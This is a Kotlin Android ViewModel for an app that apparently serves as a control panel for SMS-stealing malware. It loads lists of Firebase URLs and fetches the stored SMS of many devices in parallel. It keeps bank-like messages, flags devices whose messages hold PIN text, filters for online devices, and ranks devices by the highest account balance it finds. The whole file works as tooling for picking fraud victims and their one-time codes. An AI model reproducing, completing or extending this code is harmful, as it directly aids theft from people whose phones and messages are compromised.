package com.firebasepanel.sms.ui

import android.content.Context
import android.net.Uri
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.firebasepanel.sms.domain.ConnectionFilter
import com.firebasepanel.sms.domain.FetchResult
import com.firebasepanel.sms.domain.FilterConfig
import com.firebasepanel.sms.domain.PinFilter
import com.firebasepanel.sms.domain.RawSms
import com.firebasepanel.sms.domain.SortMode
import com.firebasepanel.sms.domain.balanceInRangeForSort
import com.firebasepanel.sms.domain.extractFirebaseUrls
import com.firebasepanel.sms.domain.fetchManyParallel
import com.firebasepanel.sms.domain.isBankLikeSms
import com.firebasepanel.sms.domain.mainBalanceForSort
import com.firebasepanel.sms.domain.messageHasPinText
import com.firebasepanel.sms.domain.messageWithinDays
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader

data class DeviceRow(
    val firebaseUrl: String,
    val deviceId: String,
    val online: Boolean,
    val deviceHasPin: Boolean,
    val maxBalance: Double,
    val smsCount: Int,
)

data class DeviceDetail(
    val firebaseUrl: String,
    val deviceId: String,
    val online: Boolean,
    val deviceHasPin: Boolean,
    val messages: List<SmsRow>,
)

data class SmsRow(
    val sender: String,
    val body: String,
    val balance: Double?,
    val messageAtMillis: Long?,
    val hasPinText: Boolean,
)

data class UiState(
    val urlsLoaded: Int = 0,
    val fetching: Boolean = false,
    val progress: String = "",
    val devices: List<DeviceRow> = emptyList(),
    val selected: DeviceDetail? = null,
    val error: String? = null,
    val config: FilterConfig =
        FilterConfig(
            sortMode = SortMode.HIGH_TO_LOW,
            pinFilter = PinFilter.BOTH,
            connection = ConnectionFilter.ONLINE,
            days = 7,
        ),
)

class PanelViewModel : ViewModel() {
    private val _state = MutableStateFlow(UiState())
    val state: StateFlow<UiState> = _state.asStateFlow()

    private var lastResults: List<FetchResult> = emptyList()

    fun updateConfig(block: (FilterConfig) -> FilterConfig) {
        _state.update { it.copy(config = block(it.config)) }
    }

    fun loadUrlsFromTxt(context: Context, uri: Uri) {
        viewModelScope.launch {
            try {
                val text =
                    context.contentResolver.openInputStream(uri)?.use { stream ->
                        BufferedReader(InputStreamReader(stream)).readText()
                    } ?: ""
                val urls = extractFirebaseUrls(text)
                _state.update {
                    it.copy(urlsLoaded = urls.size, progress = "${urls.size} Firebase URLs", error = null)
                }
                if (urls.isEmpty()) {
                    _state.update { it.copy(error = "TXT me koi Firebase URL nahi mila") }
                    return@launch
                }
                fetchAndCompute(urls)
            } catch (e: Exception) {
                _state.update { it.copy(error = e.message ?: "read fail") }
            }
        }
    }

    fun refresh() {
        // need stored urls - store in VM
        val urls = storedUrls
        if (urls.isEmpty()) return
        viewModelScope.launch { fetchAndCompute(urls) }
    }

    private var storedUrls: List<String> = emptyList()

    private suspend fun fetchAndCompute(urls: List<String>) {
        storedUrls = urls
        _state.update { it.copy(fetching = true, progress = "0/${urls.size}", devices = emptyList(), selected = null, error = null) }
        val results = fetchManyParallel(urls, concurrency = 12)
        lastResults = results
        _state.update { it.copy(fetching = false, progress = "Done ${results.count { it.online }} online / ${results.size} total") }
        applyFilters()
    }

    fun applyFilters() {
        val cfg = _state.value.config
        val devices = buildDeviceList(lastResults, cfg)
        _state.update { it.copy(devices = devices, selected = null) }
    }

    fun selectDevice(row: DeviceRow) {
        val cfg = _state.value.config
        val detail = buildDeviceDetail(lastResults, row, cfg)
        _state.update { it.copy(selected = detail) }
    }

    fun clearSelection() {
        _state.update { it.copy(selected = null) }
    }
}

private fun deviceIdFromPath(path: String): String {
    val parts = path.split("/").filter { it.isNotEmpty() }
    val li = parts.map { it.lowercase() }
    val di = li.indexOf("devices")
    if (di >= 0 && di + 1 < parts.size) return parts[di + 1]
    val mi = li.indexOfFirst { it in setOf("messages", "sms", "inbox") }
    if (mi > 0) return parts[mi - 1]
    return parts.lastOrNull() ?: "unknown"
}

private fun deviceHasPinMessages(messages: List<RawSms>): Boolean = messages.any { messageHasPinText(it.body) }

private fun pinOkForDevice(deviceHasPin: Boolean, filter: PinFilter): Boolean {
    return when (filter) {
        PinFilter.BOTH -> true
        PinFilter.WITH -> deviceHasPin
        PinFilter.WITHOUT -> !deviceHasPin
    }
}

private fun connectionOk(online: Boolean, filter: ConnectionFilter): Boolean {
    return when (filter) {
        ConnectionFilter.ONLINE -> online
        ConnectionFilter.OFFLINE -> !online
        ConnectionFilter.BOTH -> true
    }
}

private fun filterSmsList(list: List<RawSms>, cfg: FilterConfig): List<RawSms> {
    return list.filter { sms ->
        if (!isBankLikeSms(sms.body, sms.sender)) return@filter false
        if (!messageWithinDays(sms.messageAtMillis, sms.body, cfg.days)) return@filter false
        val bal = mainBalanceForSort(sms.body)
        balanceInRangeForSort(bal, cfg)
    }
}

private fun buildDeviceList(results: List<FetchResult>, cfg: FilterConfig): List<DeviceRow> {
    val rows = mutableListOf<DeviceRow>()
    for (fr in results) {
        if (!connectionOk(fr.online, cfg.connection)) continue
        val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
        for ((devId, msgs) in byDev) {
            val devicePin = deviceHasPinMessages(msgs)
            if (!pinOkForDevice(devicePin, cfg.pinFilter)) continue
            val filtered = filterSmsList(msgs, cfg)
            if (filtered.isEmpty()) continue
            val maxBal = filtered.mapNotNull { mainBalanceForSort(it.body) }.maxOrNull() ?: 0.0
            rows.add(
                DeviceRow(
                    firebaseUrl = fr.url,
                    deviceId = devId,
                    online = fr.online,
                    deviceHasPin = devicePin,
                    maxBalance = maxBal,
                    smsCount = filtered.size,
                ),
            )
        }
    }
    val sorted =
        when (cfg.sortMode) {
            SortMode.HIGH_TO_LOW -> rows.sortedByDescending { it.maxBalance }
            SortMode.LOW_TO_HIGH -> rows.sortedBy { it.maxBalance }
        }
    return sorted
}

private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: FilterConfig): DeviceDetail? {
    val fr = results.find { it.url == row.firebaseUrl } ?: return null
    val msgs = fr.sms.filter { deviceIdFromPath(it.rawPath) == row.deviceId }
    val devicePin = deviceHasPinMessages(msgs)
    val filtered = filterSmsList(msgs, cfg)
    val smsRows =
        filtered.map { s ->
            SmsRow(
                sender = s.sender,
                body = s.body,
                balance = mainBalanceForSort(s.body),
                messageAtMillis = s.messageAtMillis,
                hasPinText = messageHasPinText(s.body),
            )
        }
    val ordered =
        when (cfg.sortMode) {
            SortMode.HIGH_TO_LOW -> smsRows.sortedByDescending { it.balance ?: 0.0 }
            SortMode.LOW_TO_HIGH -> smsRows.sortedBy { it.balance ?: Double.MAX_VALUE }
        }
    return DeviceDetail(
        firebaseUrl = row.firebaseUrl,
        deviceId = row.deviceId,
        online = fr.online,
        deviceHasPin = devicePin,
        messages = ordered,
    )
}
